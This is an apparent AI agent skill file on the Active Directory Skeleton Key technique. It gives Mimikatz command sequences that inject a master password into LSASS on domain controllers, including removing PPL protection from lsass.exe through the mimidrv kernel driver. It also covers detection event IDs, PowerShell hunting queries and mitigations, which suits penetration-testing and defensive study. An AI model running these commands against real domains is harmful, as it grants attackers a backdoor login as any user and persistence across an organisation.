---
name: active-directory-skeleton-key
description: Active Directory Skeleton Key attack methodology for authentication bypass and persistence. Use this skill whenever the user mentions skeleton key attacks, AD authentication bypass, LSASS manipulation, Mimikatz misc::skeleton, master password injection, or any scenario involving creating backdoor credentials in Active Directory. Also use when asked about detecting skeleton key attacks, hunting for mimidrv.sys, or analyzing Event IDs 7045/4673/4611 related to LSA anomalies.
---

# Active Directory Skeleton Key Attack

## Overview

The **Skeleton Key attack** injects a master password into the LSASS process of domain controllers, allowing authentication as **any domain user** while their real passwords continue to work. This is a powerful persistence technique that bypasses normal AD authentication.

### Key Characteristics

- **Privileges required**: Domain Admin or SYSTEM + SeDebugPrivilege on every DC
- **Persistence**: Must be reapplied after each reboot
- **Default master password**: `mimikatz` (configurable)
- **Affected protocols**: NTLM and Kerberos RC4 (etype 0x17)
- **Limitations**: AES-only realms or accounts enforcing AES will not accept the skeleton key

## Execution Methods

### Standard LSASS (Non-PPL)

When LSASS is not protected by PPL (Protected Process Light):

```powershell
# In Mimikatz
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

### PPL-Protected LSASS

When RunAsPPL, Credential Guard, or Windows 11 Secure LSASS is enabled, a kernel driver is required:

```powershell
# In Mimikatz
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
```

**Important**: The skeleton key must be applied to **all domain controllers** in multi-DC environments. After injection, authenticate with any domain account using the master password (default: `mimikatz`).

### Compatibility Considerations

- May conflict with third-party LSA authentication packages
- May conflict with smart-card or MFA providers
- Use `/letaes` switch to avoid Kerberos/AES hooks if compatibility issues arise:
  ```
  mimikatz # misc::skeleton /letaes
  ```

## Detection and Hunting

### Event IDs to Monitor

| Event ID | Source | What to Look For |
|----------|--------|------------------|
| 7045 | System | Service/driver installation (unsigned drivers like `mimidrv.sys`) |
| 7 | Sysmon | Driver load events for `mimidrv.sys` |
| 10 | Sysmon | Suspicious access to `lsass.exe` from non-system processes |
| 4673 | Security | Sensitive privilege use (SeDebugPrivilege) |
| 4611 | Security | LSA authentication package registration anomalies |
| 4624 | Security | Logons using RC4 (etype 0x17) from DCs |

### PowerShell Detection Scripts

Use the bundled scripts in `scripts/` for automated hunting:

```bash
# Detect unsigned kernel driver installations
./scripts/detect-unsigned-drivers.ps1

# Hunt specifically for Mimikatz driver
./scripts/hunt-mimidrv.ps1

# Validate PPL enforcement after reboot
./scripts/validate-ppl.ps1
```

### Manual PowerShell Queries

```powershell
# Detect unsigned kernel driver installs
Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | Where-Object {$_.message -like "*Kernel Mode Driver*"}

# Hunt for Mimikatz driver
Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | Where-Object {$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}

# Validate PPL is enforced after reboot
Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | Where-Object {$_.message -like "*protected process*"}
```

## Mitigations

### Preventive Controls

1. **Enable LSASS Protection**
   - Keep RunAsPPL, Credential Guard, or Secure LSASS enabled on DCs
   - Forces attackers into kernel-mode driver deployment (more telemetry, harder exploitation)

2. **Disable Legacy RC4**
   - Configure Kerberos tickets to use AES only
   - Prevents the RC4 hook path used by skeleton key

3. **Monitor Driver Installations**
   - Alert on Event ID 7045 for unsigned drivers
   - Implement Sysmon Event ID 7 for driver load monitoring

4. **Privilege Monitoring**
   - Alert on Event ID 4673 for SeDebugPrivilege use
   - Monitor Event ID 4611 for LSA package registration anomalies

### Response Actions

1. **Immediate**: Reboot all domain controllers to clear the skeleton key
2. **Investigation**: Check for `mimidrv.sys` or similar unsigned drivers
3. **Forensics**: Analyze Event ID 7045 timestamps to identify initial compromise
4. **Remediation**: Review and harden LSASS protection settings

## References

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
- [Windows credentials protections](../stealing-credentials/credentials-protections.md)
